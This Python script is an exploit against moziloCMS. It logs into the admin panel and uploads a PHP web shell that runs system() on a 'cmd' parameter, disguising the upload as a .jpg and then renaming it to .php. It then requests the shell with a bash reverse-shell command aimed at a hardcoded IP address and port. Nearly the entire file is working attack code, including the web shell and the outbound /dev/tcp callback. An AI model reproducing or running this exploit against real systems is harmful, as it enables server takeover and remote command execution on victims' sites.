import requests
import colorama
from colorama import Fore
colorama.init(autoreset=True)
import argparse
import threading
import subprocess
import time
import random

def banner():
    banner = Fore.LIGHTRED_EX + """
                                                                                                 
 @@@@@@   @@@        @@@@@@    @@@@@@   @@@  @@@   @@@@@@@@   @@@  @@@           @@@  
@@@@@@@   @@@       @@@@@@@@  @@@@@@@   @@@  @@@  @@@@@@@@@@  @@@  @@@          @@@   
!@@       @@!       @@!  @@@  !@@       @@!  @@@  @@!   @@@@  @@!  !@@         @@!    
!@!       !@!       !@!  @!@  !@!       !@!  @!@  !@!  @!@!@  !@!  @!!        !@!     
!!@@!!    @!!       @!@!@!@!  !!@@!!    @!@!@!@!  @!@ @! !@!   !@@!@!        @!!      
 !!@!!!   !!!       !!!@!!!!   !!@!!!   !!!@!!!!  !@!!!  !!!    @!!!        !!!       
     !:!  !!:       !!:  !!!       !:!  !!:  !!!  !!:!   !!!   !: :!!      !!:        
    !:!    :!:      :!:  !:!      !:!   :!:  !:!  :!:    !:!  :!:  !:!    ::!         
:::: ::    :: ::::  ::   :::  :::: ::   ::   :::  ::::::: ::   ::  :::    ::          
:: : :    : :: : :   :   : :  :: : :     :   : :   : : :  :    :   ::   : :           
"""

    info = Fore.LIGHTGREEN_EX + """
 +---------------------------------------------------------------------+  
 |                                                                     |
 |  """+Fore.YELLOW+"Email:" + Fore.WHITE + """ bedellinicat123@gmail.com    """+Fore.LIGHTGREEN_EX+"                               |""""
 |                                                                     |
 |  """+Fore.CYAN+"Linkedin:" + Fore.WHITE + """ https://www.linkedin.com/in/nicat-abbasli-872016261/"""+Fore.LIGHTGREEN_EX+"     |""""   
 |                                                                     |
 |  """+Fore.MAGENTA+"Whoami?:" + Fore.WHITE + """ Slash0x/"""+Fore.LIGHTGREEN_EX+"                                                  |""""
 |                                                                     |
 +---------------------------------------------------------------------+
"""+Fore.RESET
    banner= banner+info
    return banner

def user_credentials():
    username = input(Fore.YELLOW+' [=]'+Fore.RESET+' Username: ')
    password = input(Fore.YELLOW+' [=]'+Fore.RESET+' Password: ')
    return username,password

def login_process(login_url,username,password):

    headers_login = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"127\", \"Not)A;Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Accept-Language": "en-US", "Upgrade-Insecure-Requests": "1", "Origin": "http://localhost:3333", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://localhost:3333/admin/index.php?logout=true", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    body_login = {
    'username':username,
    'password':password,
    'login':'Login'
    }

    res = requests.post(login_url,headers=headers_login,data=body_login)
    if 'moziloCMS Admin - Home' in str(res.content):
        return res.cookies.get('MOZILOID_12771b5b63b2b77f442bb8fb6591708e')
    return False

    

def upload_process(upload_url,cookie,vulnerable_code,filename):
    cookies = {"MOZILOID_12771b5b63b2b77f442bb8fb6591708e": cookie}
    new_filename = filename+'.jpg'
    headers_upload = {"sec-ch-ua": "\"Chromium\";v=\"127\", \"Not)A;Brand\";v=\"99\"", "Accept-Language": "en-US", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary2CmMiCIxwidcPnA3", "Accept": "text/html, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "sec-ch-ua-platform": "\"Windows\"", "Origin": "http://localhost:3333", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "http://localhost:3333/admin/index.php?nojs=true&action=files&multi=true", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    body_upload = f"------WebKitFormBoundary2CmMiCIxwidcPnA3\r\nContent-Disposition: form-data; name=\"curent_dir\"\r\n\r\nWillkommen\r\n------WebKitFormBoundary2CmMiCIxwidcPnA3\r\nContent-Disposition: form-data; name=\"chancefiles\"\r\n\r\ntrue\r\n------WebKitFormBoundary2CmMiCIxwidcPnA3\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nfiles\r\n------WebKitFormBoundary2CmMiCIxwidcPnA3\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"{new_filename}\"\r\nContent-Type: image/jpeg\r\n\r\n{vulnerable_code}\r\n------WebKitFormBoundary2CmMiCIxwidcPnA3--\r\n"
    res = requests.post(upload_url, headers=headers_upload, cookies=cookies, data=body_upload)
    if 'moziloCMS Admin - Login' not in str(res.content) and filename in str(res.content):
        #print(res.content)
        return (Fore.LIGHTGREEN_EX+' [+]'+Fore.RESET+' File Uploaded!')#
    return False



def rename_file(upload_url,cookie,filename):
    old_filename=filename+'.jpg'
    cookies = {"MOZILOID_12771b5b63b2b77f442bb8fb6591708e": cookie}
    headers_rename = {"sec-ch-ua": "\"Chromium\";v=\"127\", \"Not)A;Brand\";v=\"99\"", "Accept-Language": "en-US", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "text/html, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "sec-ch-ua-platform": "\"Windows\"", "Origin": "http://localhost:3333", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "http://localhost:3333/admin/index.php?nojs=true&action=files&multi=true", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    body_rename = {"action": "files", "newfile": filename, "orgfile": old_filename, "curent_dir": "Willkommen", "changeart": "file_rename"}
    res = requests.post(upload_url,headers=headers_rename,data=body_rename,cookies=cookies)
    if 'moziloCMS Admin - Login' not in str(res.content) and 'success' in str(res.content):
        time.sleep(0.8)
        return (Fore.LIGHTGREEN_EX+' [+]'+Fore.RESET+' File Renamed Successfuly!')#
    elif 'Folder or file does not exist' in str(res.content):
        time.sleep(0.8)
        return (Fore.RED+' [-]'+Fore.RESET+" Folder or File doesn't exist with this name")
    elif 'The Folder or file already exist.' in str(res.content):
        time.sleep(0.8)
        return (Fore.RED+' [-]'+Fore.RESET+" The Folder or file already exist.\n[+] Continue...")
    return False

def get_shell(ip,port,uploaded_endP):
    url = uploaded_endP + f"bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/172.23.82.103/7878%200%3E%261%27"
    time.sleep(0.8)
    print(Fore.LIGHTGREEN_EX+' [+]'+Fore.RESET+' Reverse shell sent to the target')
    try:
        time.sleep(0.8)
        print(Fore.LIGHTGREEN_EX+' [+]'+Fore.RESET+' Exploiting Successfuly started!')
        requests.get(url)
    except Exception as e:
        print(Fore.LIGHTRED_EX+' [-]'+Fore.RESET+" Error sending shell: {e}")

def listener(ip,port,uploaded_endP):
   
    shell_thread = threading.Thread(target=get_shell, args=(ip,port,uploaded_endP))
    shell_thread.start()
    

if __name__ == "__main__":

    #   PARSER
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", help="target host address")
    parser.add_argument("-i", help="Listener ip address")
    parser.add_argument("-p", help="Listener port address")
    args = parser.parse_args()
    ip = args.i
    host = args.t
    port = args.p


    vulnerable_code = """
        <html>
            <body>
            <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
            <input type="TEXT" name="cmd" id="cmd" size="80">
            <input type="SUBMIT" value="Execute">
            </form>
            <pre>
            <?php
                if(isset($_GET['cmd']))
                {
                    system($_GET['cmd']);
                }
            ?>
            </pre>
            </body>
            <script>document.getElementById("cmd").focus();</script>
            </html>
    """


    if ip==None or host==None or port==None:
        print(Fore.CYAN+' [!]'+Fore.RESET+' Please set ip,port and host.\n[!] For help: python3 exploit.py -h') 
        quit()

    print(banner())

    username,password = user_credentials()
    print("\n  ---------------------------------------------------------------------\n")
    filename = 'evil'+str(random.randint(100000,999999))+'.php'
    login_url = f'http://{host}/admin/index.php'
    upload_url = f'http://{host}/admin/index.php'
    uploaded_endP = f'http://{host}/kategorien/Willkommen/dateien/{filename}?cmd='
    cookie = login_process(login_url, username, password)
    
    if cookie!=False:
        print(Fore.LIGHTGREEN_EX+' [+]'+Fore.RESET+f' Got cookie: {cookie}')
        time.sleep(0.8)
        print(upload_process(upload_url,cookie,vulnerable_code,filename))
        time.sleep(0.8)
        print(Fore.BLUE+' [~]'+Fore.RESET+f' Please start listening in Netcat {ip}:{port}')
        time.sleep(3)
        print(rename_file(upload_url,cookie,filename))
        time.sleep(0.8)
        listener(ip,port,uploaded_endP)
    else:
        print(Fore.RED+' [-]'+Fore.RESET+' Username or Password Incorect!')
